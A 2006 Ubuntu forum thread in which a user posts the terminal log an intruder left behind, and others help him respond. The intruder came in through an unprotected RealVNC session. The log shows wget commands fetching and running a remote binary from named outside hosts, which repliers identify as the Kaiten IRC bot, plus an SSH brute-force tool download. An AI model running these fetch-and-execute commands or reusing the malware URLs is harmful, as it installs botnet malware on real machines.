---
title: "Security - did someone broke into my Ubuntu?"
date: 2006-09-29
forum: Desktop Environments
---

### Post by YigalB on 2006-09-29
The below is what I saw on my Ubuntu. I did NOT open that terminal window, Could it be someone broke into? I did open the router's ports to allow emule work faster.
==============================================
yigal@yigal-Linux:~$ls

Desktop     easyubuntu-3.0.tar.gz    Examples  &#1491;&#1491;&#1491;&#1491;.pdf
easyubuntu  easyubuntu-3.0.tar.gz.1  temp

yigal@yigal-Linux:~$ id

uid=1000(yigal) gid=1000(yigal) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),106(lpadmin),110(scanner),112(admin),1000(yigal)

yigal@yigal-Linux:~$ uname -a

Linux yigal-Linux 2.6.15-27-386 #1 PREEMPT Sat Sep 16 01:51:59 UTC 2006 i686 GNU/Linux

yigal@yigal-Linux:~$ wget [http://users.volja.net/satanx/shh](http://users.volja.net/satanx/shh)

--16:14:45--  [http://users.volja.net/satanx/shh](http://users.volja.net/satanx/shh)
           => `shh'

Resolving users.volja.net... 217.72.64.90, 217.72.64.91

Connecting to users.volja.net|217.72.64.90|:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 33,819 (33K) [text/plain]


20% [======>                              ] 6,964          8.46K/s

100%[====================================>] 33,819         8.27K/s    ETA 00:00


16:15:05 (8.26 KB/s) - `shh' saved [33819/33819]


yigal@yigal-Linux:~$

yigal@yigal-Linux:~$ hmod +x shh
bash: hmod: 
command not found

yigal@yigal-Linux:~$ ./shh

bash: ./shh: Permission denied

yigal@yigal-Linux:~$ chmod +x shh

yigal@yigal-Linux:~$ ./shh

yigal@yigal-Linux:~$ --16:17:49--  [http://www.free-ftp.org/genius1987/bht-ssh.tar.gz](http://www.free-ftp.org/genius1987/bht-ssh.tar.gz)
           => `bht-ssh.tar.gz'

Resolving [www.free-ftp.org](www.free-ftp.org)... 85.10.207.83

Connecting to www.free-ftp.org|85.10.207.83|:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 621,798 (607K) [gz]


39% [=============>                       ] 244,497       23.21K/s    ETA 00:15

77% [===========================>         ] 480,217       11.98K/s    ETA 00:06sh: curl: command 
not found

78% [============================>        ] 489,001       12.19K/s    ETA 00:06

gzip: stdin: unexpected end of file

tar: Unexpected EOF in archive

tar: Unexpected EOF in archive

tar: Error is not recoverable: exiting now

100%[====================================>] 621,798        9.37K/s    ETA 00:00


16:18:27 (16.45 KB/s) - `bht-ssh.tar.gz' saved [621798/621798]


--16:18:50--  [http://www.free-ftp.org/genius1987/de-newest.txt](http://www.free-ftp.org/genius1987/de-newest.txt)
           => `de-newest.txt'

Resolving [www.free-ftp.org](www.free-ftp.org)... 85.10.207.83

Connecting to www.free-ftp.org|85.10.207.83|:80... connected.

HTTP request sent, awaiting response... 200 OK

Length: 2,602 (2.5K) [text/html]


100%[====================================>] 2,602          7.72K/s


16:18:56 (7.72 KB/s) - `de-newest.txt' saved [2602/2602]


sh: curl: command not found

mv: cannot stat `de-newest.txt': No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

ls: vuln*: No such file or directory

---

### Post by Ayman on 2006-09-29
It looks like someone is trying to download SSH brute force tools, where did you find those commands? Anything interesting in .bash_history or /var/log/messages?

I'd say:
1) Disconnect the box immediately.
2) Create a backup of your important files.
3) Investigate how this happens, to prevent it from happening again.
4) Nuke the installation and start fresh, this is the only way to make sure that box becomes clean again.

Edit:
Additional things to look at:
1) Open ports.
2) Running processes.

---

### Post by Jussi Kukkonen on 2006-09-29
Yeah, someone had access and executed a file he downloaded form the internet...

But if you see that in a terminal window, it means someone physically sat down at your coomputer and did that -- so he didn't "break in" in that sense. Think who could have had access to your machine, that's the best way to find the culprit...

Anyway, you shold **consider your machine *totally* breached.** Do not use it for anything serious -- you should e.g. expect there to be a keylogger in place to record your passwords.

Ayman has good advice. Even if you go through all the files on the machine, you'll never be 100% sure that it's clean -- I suggest a clean install too. If you intend to investigate what happened, be careful with the executables you find (there's at least the somhow broken ~/ssh script that the intruder used). Reading them, if they're just scripts, might be interesting. 

One more warning: if you find a trojan or something like it, don't be content with removing just that. It's pretty standard practice to leave several backdoors on compromised machines...

---

### Post by Jussi Kukkonen on 2006-09-29
I id some research as the files are still available...

It seems the shh executable is a IRCbot, or at least something related to that. If that is correct and it's working, your machine is now part of a zombie botnet.

EDIT: it seems to be a newish version of an old IRCBot: Kaiten/Keitan

---

### Post by YigalB on 2006-09-29
Thanks. Some more information:
- no one came and set infront of that PC, 100% sure.
- I found this window open at morning time - so someone hacked inside during night.
- I control this computer through RealVNC
- Also, the ports are opened for the eMUle in my Edimax router 
How can I balance between emule's need for open ports and the need to keep my PC safety?
- I have no probelm to re-install, and will do so asap, although I had in mind that Linux is safer than MS' OS.
- I didn't install any SW, except those on Synaptic. How could it be someone broke into? 

What can I do to prevent such things?

---

### Post by Stealth on 2006-09-29
Well, it seems like they were able to VNC into the machine too. how strong was that password, if any? Ubuntu is very safe, and there is no way to get into it from a clean install, that I know of...

---

### Post by KingArthur10 on 2006-09-29
I agree with Stealth.  This sounds like the person hacked your VNC, not your Ubuntu OS.  Once the person hacked your password, he was given full access to your system.  This would happen in Windows or MacOS with VNC enabled and hacked.  If you use VNC, you must use a password 8 characters long with an upper case, a lower case, a number, and a special character like the number sign or dollar sign or something.

---

### Post by YigalB on 2006-09-29
Since I can't really watch my screen day and night, I was wondering: is there a way to use the screen saver operation, and generate a log file which keeps tracking of the each time the screen saver stopped working? All I need is onle line per screesaver disactivity, with date and time. I could easily see if it's abnormal time.

---

### Post by YigalB on 2006-09-29
To KingArthur10 and Stealth - it seems you are both correct. I was using RealVNC without password.
The funny thing is that I was trying to approach it from work, and I couldn't (how can I approach an internal IP while the router gets only one external IP?).
I will fix that immedialtly, after re-installing the whole system.

---

### Post by mistab1034 on 2006-09-29
so I have to say this guy wasn't a very good hacker if he can't even close his xterm's to hide his tracks.

But to get access to your machine from work you can set your router to port forward to your machine on which ever port RealVNC works on. What'd I'd also do if your only planning on trying to remote administer from work you can set /etc/hosts.deny to deny all with
```
ALL: ALL
```
That way it blocks any attemp to gain access to your machine remotely. Then in /etc/hosts.allow put the IP address of the machine your logging in from at work.

```
ALL: (work ip address)
```

Another thing with the RealVNC password, don't make it the same as your user account password so if one gets cracked the other doesn't also.

---

